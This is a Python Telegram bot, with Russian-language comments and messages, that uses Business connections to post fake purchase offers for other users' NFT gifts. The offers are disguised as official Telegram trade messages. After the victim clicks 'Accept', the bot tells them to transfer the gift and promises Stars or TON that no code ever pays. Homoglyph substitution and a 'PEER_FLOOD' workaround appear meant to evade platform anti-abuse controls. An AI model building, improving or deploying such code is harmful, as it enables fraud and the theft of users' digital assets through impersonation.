import asyncio
import hmac
import html
import json
import logging
import math
import os
import random
import re
import time
import uuid

from aiohttp import ClientSession, ClientTimeout, web

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("offers")

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_URL = (os.environ.get("PUBLIC_URL") or os.environ.get("RENDER_EXTERNAL_URL", "")).rstrip("/")
SECRET = os.environ.get("WEBHOOK_SECRET") or BOT_TOKEN.split(":")[1][:32]
API = f"{os.environ.get('TG_API', 'https://api.telegram.org')}/bot{BOT_TOKEN}"
DATA_FILE = os.environ.get("OFFERS_FILE", "offers.json")

BRAND = os.environ.get("BRAND", "Telegram")
TEST_NOTICE = os.environ.get("TEST_NOTICE", "")
OFFER_TTL = int(float(os.environ.get("OFFER_HOURS", 6)) * 3600)
TRANSFER_MIN = int(os.environ.get("TRANSFER_MINUTES", 10))
STRICT = os.environ.get("OFFER_STRICT") == "1"
MAX_STARS = 100_000_000
UPDATES = ["message", "callback_query", "business_connection", "business_message"]
NBSP = "\u00a0"

OFFER_EDIT_DELAY = max(1.0, float(os.environ.get("OFFER_EDIT_DELAY", "1.0")))
HOMOGLYPH_RATE = float(os.environ.get("HOMOGLYPH_RATE", "0.75"))

http = None
bot_name = ""
connections, offers = {}, {}
tasks = set()

EMOJI_CROSS = "5260342697075416641"
EMOJI_CHECK = "5260416304224936047"
EMOJI_TG = "5258073068852485953"

# ============ HOMOGLYPH STYLE ============
_HOMOGLYPH = {
    "а": ["a"], "с": ["c"], "е": ["e"], "о": ["o", "ο"],
    "р": ["p"], "х": ["x"], "у": ["y"], "к": ["κ"],
    "А": ["A"], "В": ["B"], "Е": ["E"], "К": ["K"],
    "М": ["M"], "Н": ["H"], "О": ["O"], "Р": ["P"],
    "С": ["C"], "Т": ["T"], "У": ["Y"], "Х": ["X"],
    "І": ["I"], "Ј": ["J"], "Ѕ": ["S"],
}

_TAG_RE = re.compile(r"<(/?)(b|i|u|s|code|a|pre|em|strong|tg-spoiler)(\s[^>]*)?>", re.IGNORECASE)

def _style_plain(s: str) -> str:
    res = []
    for ch in s:
        variants = _HOMOGLYPH.get(ch)
        if variants and random.random() < HOMOGLYPH_RATE:
            res.append(random.choice(variants))
        else:
            res.append(ch)
    return "".join(res)

def style(text: str) -> str:
    out = []
    pos = 0
    depth = 0
    for m in _TAG_RE.finditer(text):
        chunk = text[pos:m.start()]
        out.append(_style_plain(chunk) if depth == 0 else chunk)
        out.append(m.group(0))
        if m.group(1) == "/":
            depth = max(0, depth - 1)
        else:
            depth += 1
        pos = m.end()
    tail = text[pos:]
    out.append(_style_plain(tail) if depth == 0 else tail)
    return "".join(out)

# ============ БАЗОВЫЕ ФУНКЦИИ ============

def esc(s):
    return html.escape(str(s))

def num(x):
    return f"{x:,}".replace(",", NBSP)

def btn(text, data, icon_id=None):
    b = {"text": text, "callback_data": data}
    if icon_id:
        b["icon_custom_emoji_id"] = icon_id
    return b

def background(coro):
    task = asyncio.create_task(coro)
    tasks.add(task)
    task.add_done_callback(tasks.discard)
    return task

async def api(method, **params):
    async with http.post(f"{API}/{method}", json=params) as resp:
        data = await resp.json()
    if not data.get("ok"):
        log.warning(
            "Telegram API error | method=%s | code=%s | description=%s | parameters=%s",
            method, data.get("error_code"), data.get("description"), data.get("parameters")
        )
    return data

async def send(chat, text, kb=None, bcid=None, preview=False):
    text = style(text)
    params = dict(chat_id=chat, text=text, parse_mode="HTML")
    params["link_preview_options"] = {"is_disabled": not preview}
    if kb:
        params["reply_markup"] = kb
    if bcid:
        params["business_connection_id"] = bcid
    return await api("sendMessage", **params)

async def delete_business_message(bcid, mid):
    return await api("deleteBusinessMessages", business_connection_id=bcid, message_ids=[mid])

async def edit_offer(o, text, kb=None, preview=True):
    text = style(text)
    params = dict(chat_id=o["chat"], message_id=o["mid"], business_connection_id=o["bcid"],
                  text=text, parse_mode="HTML", reply_markup=kb or {"inline_keyboard": []})
    params["link_preview_options"] = {"is_disabled": not preview}
    res = await api("editMessageText", **params)
    if not res.get("ok") and "not modified" in (res.get("description") or "").lower():
        return {"ok": True}
    return res

def save():
    for oid in sorted(offers, key=lambda k: offers[k]["created"])[:-500]:
        del offers[oid]
    tmp = f"{DATA_FILE}.tmp"
    try:
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump({"connections": connections, "offers": offers}, f, ensure_ascii=False)
        os.replace(tmp, DATA_FILE)
    except OSError as e:
        log.error("не удалось сохранить %s: %s", DATA_FILE, e)

def load():
    try:
        with open(DATA_FILE, encoding="utf-8") as f:
            data = json.load(f)
    except FileNotFoundError:
        return
    except (OSError, ValueError) as e:
        log.error("%s не читается: %s", DATA_FILE, e)
        return
    connections.update(data.get("connections", {}))
    offers.update(data.get("offers", {}))

NFT_LINK = re.compile(r"(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)", re.I)
SLUG = re.compile(r"^(.+)-(\d+)$")
TON_ADDRESS = re.compile(r"(?:EQ|UQ)[A-Za-z0-9_-]{46}", re.I)

USAGE = ("Формат:\n"
         "<code>ooo ссылка сумма</code> (звезды)\n"
         "<code>ttt ссылка сумма</code> (TON)\n"
         "<code>ttt ссылка адрес сумма</code> (TON на кошелек)")

def gift_name(slug):
    m = SLUG.match(slug)
    if not m:
        return None
    return f"{re.sub(r'(?<=[a-z0-9])(?=[A-Z])', ' ', m.group(1))} #{m.group(2)}"

def parse_offer(arg):
    link = NFT_LINK.search(arg)
    if not link:
        return None, "Не нашёл ссылку на NFT вида https://t.me/nft/DurovsCap-1234"
    slug = link.group(1)
    name = gift_name(slug)
    if not name:
        return None, "Это не похоже на ссылку на NFT: в конце должен быть номер."
    
    rest = f"{arg[:link.start()]} {arg[link.end():]}".strip()
    
    address_match = TON_ADDRESS.search(rest)
    address = address_match.group(0) if address_match else None
    
    if address:
        rest = rest.replace(address, "")
        
    amount = re.search(r"\d[\d_,]*", rest)
    if not amount:
        return None, "Не нашёл сумму."
    val = int(re.sub(r"[_,]", "", amount.group()))
    
    if not 1 <= val <= MAX_STARS:
        return None, f"Сумма должна быть от 1 до {num(MAX_STARS)}."
        
    return {"slug": slug, "name": name, "amount": val, "address": address}, None

def maker_label(o):
    u = o["maker"]
    return esc(u.get("name") or u.get("username") or "пользователь")

def gift_link(o):
    return f'<a href="https://t.me/nft/{esc(o["slug"])}">{esc(o["name"])}</a>'

def left_text(seconds):
    minutes = math.ceil(max(0, seconds) / 60)
    h, m = divmod(minutes, 60)
    return f"{h} ч. {m} мин." if h else f"{m} мин."

# ============ ТЕКСТЫ ДЛЯ ТРЕХ ШАГОВ ============

# ШАГ 1: "Вы точно хотите..."
def preoffer_text(o):
    if o.get("currency") == "TON":
        addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
        amount = f"{num(o['amount'])} TON"
        return (f"Вы точно хотите отправить сделку на {gift_link(o)} за <b>{amount}</b>{addr_text}?\n\n"
                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
    else:
        amount = f'{num(o["amount"])} звёзд'
        return (f"Вы точно хотите отправить сделку на {gift_link(o)} за <b>{amount}</b>?\n\n"
                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")

# ШАГ 2: Настоящий оффер (после первого "Принять")
def offer_text(o):
    if o.get("currency") == "TON":
        addr_text = f" на ваш адрес <code>{esc(o['address'])}</code>" if o.get("address") else ""
        amount = f"{num(o['amount'])} TON"
        return (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b>{addr_text} за подарок {gift_link(o)}.\n\n"
                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")
    else:
        amount = f'{num(o["amount"])} звёзд'
        return (f"<b>{maker_label(o)}</b> предлагает Вам <b>{amount}</b> за подарок {gift_link(o)}.\n\n"
                f"Предложение действует ещё {left_text(o['expires'] - time.time())}")

# ШАГ 3: Сделка принята
def accepted_text(o):
    u = o["maker"]
    username = u.get("username") or "пользователя"
    
    if o.get("currency") == "TON":
        addr_text = f" адреса <code>{esc(o['address'])}</code>" if o.get("address") else ""
        amount = f"{num(o['amount'])} TON"
        return (
            f"<b>Сделка принята!</b>\n\n"
            f"Передайте подарок {gift_link(o)} "
            f"пользователю @{esc(username)} для успешного закрытия сделки, "
            f"после чего <b>{amount}</b> автоматически отправятся на ваш баланс{addr_text}."
        )
    else:
        amount = f'{num(o["amount"])} звёзд'
        return (
            f"<b>Сделка принята!</b>\n\n"
            f"Передайте подарок {gift_link(o)} "
            f"пользователю @{esc(username)} для успешного закрытия сделки, "
            f"после чего <b>{amount}</b> отправятся на ваш баланс."
        )

# ============ КЛАВИАТУРЫ ============

def preoffer_kb(o):
    return {
        "inline_keyboard": [[
            btn("Отклонить", f"of:pre_no:{o['id']}", EMOJI_CROSS),
            btn("Принять", f"of:pre_ok:{o['id']}", EMOJI_CHECK)
        ]]
    }

def offer_kb(o):
    return {
        "inline_keyboard": [[
            btn("Отклонить", f"of:no:{o['id']}", EMOJI_CROSS),
            btn("Принять", f"of:ok:{o['id']}", EMOJI_CHECK)
        ]]
    }

def accepted_kb(o):
    u = o["maker"]
    if u.get("username"):
        transfer_url = f"tg://send_gift?to={u['username']}"
    else:
        transfer_url = f"tg://user?id={u.get('id', 0)}"

    return {
        "inline_keyboard": [
            [
                btn("Отменить", f"of:cancel:{o['id']}", EMOJI_CROSS),
                {
                    "text": "Передать", 
                    "url": transfer_url,
                    "icon_custom_emoji_id": EMOJI_TG
                }
            ]
        ]
    }

# ============ ЛОГИКА ============

async def make_offer(m, maker, bcid, currency="STARS"):
    cmd, _, arg = (m.get("text") or "").partition(" ")
    parsed, error = parse_offer(arg)
    chat = m["chat"]["id"]
    now = time.time()

    try:
        await delete_business_message(bcid, m["message_id"])
    except Exception:
        pass

    if error:
        return await send(chat, f"⚠️ {esc(error)}\n\n{USAGE}", bcid=bcid, preview=False)

    o = {"id": uuid.uuid4().hex[:8], **parsed, "currency": currency, "bcid": bcid, "chat": chat, "mid": None, "maker": maker,
         "status": "pending", "created": now, "expires": now + OFFER_TTL}
    offers[o["id"]] = o
    save()

    # 1. Отправляем точку (обход PEER_FLOOD)
    res = await send(chat, ".", bcid=bcid, preview=False)
    
    if res.get("ok"):
        o["mid"] = res["result"]["message_id"]
        save()
        # 2. Ждем 3 секунды
        await asyncio.sleep(3)
        # 3. Редактируем точку в ПРЕДОФФЕР ("Вы точно хотите...")
        await edit_offer(o, preoffer_text(o), preoffer_kb(o), preview=True)
    else:
        desc = res.get("description", "")
        if "PEER_FLOOD" not in desc:
            log.error(f"Ошибка при создании оффера: {desc}")

async def sweeper():
    while True:
        await asyncio.sleep(60)
        for o in list(offers.values()):
            if o["status"] not in ("pending", "accepted"):
                continue
            try:
                if o["expires"] < time.time():
                    try:
                        await delete_business_message(o["bcid"], o["mid"])
                    except Exception:
                        pass
                    o["status"] = "expired"
                    save()
            except Exception:
                pass

async def on_callback(q):
    parts = q.get("data", "").split(":")
    if len(parts) != 3 or parts[0] != "of":
        return await api("answerCallbackQuery", callback_query_id=q["id"])
        
    action = parts[1]
    o = offers.get(parts[2])
    
    if o is None:
        return await api("answerCallbackQuery", callback_query_id=q["id"], text="Оффер устарел", show_alert=True)
        
    if time.time() > o["expires"]:
        try:
            await delete_business_message(o["bcid"], o["mid"])
        except: pass
        return await api("answerCallbackQuery", callback_query_id=q["id"], text="Срок предложения истёк", show_alert=True)

    # ШАГ 1: Ответ на "Вы точно хотите..."
    if action == "pre_ok":
        o["status"] = "pending_offer"
        save()
        await edit_offer(o, offer_text(o), offer_kb(o), preview=True)
        await api("answerCallbackQuery", callback_query_id=q["id"])
    elif action == "pre_no":
        try:
            await delete_business_message(o["bcid"], o["mid"])
        except: pass
        o["status"] = "declined"
        save()
        await api("answerCallbackQuery", callback_query_id=q["id"])

    # ШАГ 2: Ответ на настоящий оффер
    elif action == "ok":
        o["status"] = "accepted"
        save()
        await edit_offer(o, accepted_text(o), accepted_kb(o), preview=True)
        await api("answerCallbackQuery", callback_query_id=q["id"])
    elif action == "no":
        try:
            await delete_business_message(o["bcid"], o["mid"])
        except: pass
        o["status"] = "declined"
        save()
        await api("answerCallbackQuery", callback_query_id=q["id"])

    # ШАГ 3: Отмена после принятия
    elif action == "cancel":
        try:
            await delete_business_message(o["bcid"], o["mid"])
        except: pass
        o["status"] = "cancelled"
        save()
        await api("answerCallbackQuery", callback_query_id=q["id"])

def conn_from(c):
    rights = c.get("rights")
    rights = rights if isinstance(rights, dict) else {}
    can_reply = bool(rights.get("can_reply", c.get("can_reply")))
    can_delete = bool(rights.get("can_delete_all_messages"))
    user = c["user"]
    chat_id = user.get("id") 
    return {"id": c["id"], "user_id": user["id"], "chat": chat_id, "name": user.get("first_name", ""),
            "username": user.get("username"), "enabled": c.get("is_enabled", True), "can_reply": can_reply,
            "can_delete": can_delete}

async def on_connection(c):
    conn = conn_from(c)
    connections[conn["id"]] = conn
    save()
    if not conn["enabled"]:
        text = "🔌 Бот отключён."
    elif not conn["can_reply"]:
        text = "⚠️ Бот подключён, но без права отвечать."
    else:
        text = ("✅ <b>Готово, бот подключён.</b>\n\n"
                "В любом чате напиши:\n"
                "<code>ooo ссылка сумма</code>\n"
                "<code>ttt ссылка сумма</code>\n"
                "<code>ttt ссылка адрес сумма</code>")
    await send(conn["chat"], text)

async def get_connection(bcid):
    conn = connections.get(bcid)
    if conn is None:
        res = await api("getBusinessConnection", business_connection_id=bcid)
        if res.get("ok"):
            conn = connections[bcid] = conn_from(res["result"])
            save()
    return conn

async def on_business_message(m):
    text = (m.get("text") or "").strip()
    cmd = text.partition(" ")[0].lower()
    
    if cmd == "ooo":
        currency = "STARS"
    elif cmd == "ttt":
        currency = "TON"
    else:
        return
        
    conn = await get_connection(m["business_connection_id"])
    frm = m.get("from") or {}
    if not conn or frm.get("id") != conn["user_id"]:
        return
    if not (conn["enabled"] and conn["can_reply"]):
        return await send(conn["chat"], "⚠️ У бота нет права отвечать на сообщения.")
        
    maker = {"id": frm["id"], "name": frm.get("first_name", ""), "username": frm.get("username")}
    
    await make_offer(m, maker, conn["id"], currency)

async def on_message(m):
    chat = m["chat"]["id"]
    cmd = (m.get("text") or "").strip().split()[:1]
    cmd = cmd[0].split("@")[0].lower() if cmd else ""
    if cmd in ("/start", "/help"):
        kb = {"inline_keyboard": [[{"text": "📋 Скопировать юзернейм бота",
                                    "copy_text": {"text": f"@{bot_name}"}}]]}
        await send(chat, "👋 Привет!", kb)

async def handle(update):
    try:
        if "business_connection" in update:
            await on_connection(update["business_connection"])
        elif "business_message" in update:
            await on_business_message(update["business_message"])
        elif "callback_query" in update:
            await on_callback(update["callback_query"])
        elif "message" in update:
            await on_message(update["message"])
    except Exception:
        log.exception("апдейт %s", update.get("update_id"))

async def webhook(req):
    token = req.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
    if not hmac.compare_digest(token.encode(), SECRET.encode()):
        return web.Response(status=403)
    try:
        update = await req.json()
    except ValueError:
        return web.Response(status=400)
    background(handle(update))
    return web.Response(text="ok")

async def health(req):
    return web.Response(text="ok")

async def keepalive():
    while True:
        await asyncio.sleep(600)
        try:
            async with http.get(f"{PUBLIC_URL}/health") as resp:
                await resp.read()
        except Exception as e:
            log.warning("keepalive: %s", e)

async def poll_updates():
    await api("deleteWebhook")
    offset = 0
    while True:
        try:
            data = await api("getUpdates", offset=offset, timeout=30, allowed_updates=UPDATES)
            for update in data.get("result", []):
                offset = update["update_id"] + 1
                background(handle(update))
            if not data.get("ok"):
                await asyncio.sleep(3)
        except Exception as e:
            log.warning("getUpdates: %s", e)
            await asyncio.sleep(3)

async def main():
    global http, bot_name
    http = ClientSession(timeout=ClientTimeout(total=70))
    load()
    me = (await api("getMe")).get("result") or {}
    if not me:
        raise SystemExit("BOT_TOKEN не подходит")
    bot_name = me["username"]
    log.info("юзернейм бота: @%s", bot_name)
    
    await api("setMyCommands", commands=[
        {"command": "start", "description": "Подключение"}
    ])
    
    background(sweeper())
    if PUBLIC_URL:
        app = web.Application()
        app.router.add_get("/health", health)
        app.router.add_post("/webhook", webhook)
        runner = web.AppRunner(app)
        await runner.setup()
        await web.TCPSite(runner, "0.0.0.0", int(os.environ.get("PORT", 10000))).start()
        await api("setWebhook", url=f"{PUBLIC_URL}/webhook", secret_token=SECRET,
                  allowed_updates=UPDATES, drop_pending_updates=True)
        background(keepalive())
    else:
        background(poll_updates())
    log.info("оффер-бот @%s запущен", bot_name)
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
